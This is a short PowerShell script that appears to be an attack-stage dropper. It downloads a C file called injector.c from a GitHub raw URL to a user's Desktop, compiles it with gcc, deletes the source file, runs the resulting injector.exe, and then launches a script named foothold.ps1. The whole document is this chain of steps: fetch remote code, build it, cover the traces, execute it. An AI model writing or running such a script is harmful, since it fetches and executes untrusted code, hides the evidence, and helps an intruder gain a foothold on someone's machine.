
#Download injector.c
(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lacouls/Public_download/refs/heads/main/injector.c', 'c:\Users\saurav\Desktop\injector1.c')

#sleep for 10 second
start-sleep -s 10

#compiles the c code to generated executable
cmd.exe /c 'gcc "C:\Users\saurav\Desktop\injector1.c" -o "C:\Users\saurav\Desktop\injector.exe"'

#Sleep for 5 second
Start-Sleep -s 5

#remove the injector.c
Remove-Item -path "C:\Users\saurav\Desktop\injector1.c"

#execute the injector.exe
Start-Process -filepath "C:\Users\saurav\Desktop\injector.exe" 

cmd.exe /c 'powershell -f foothold.ps1'
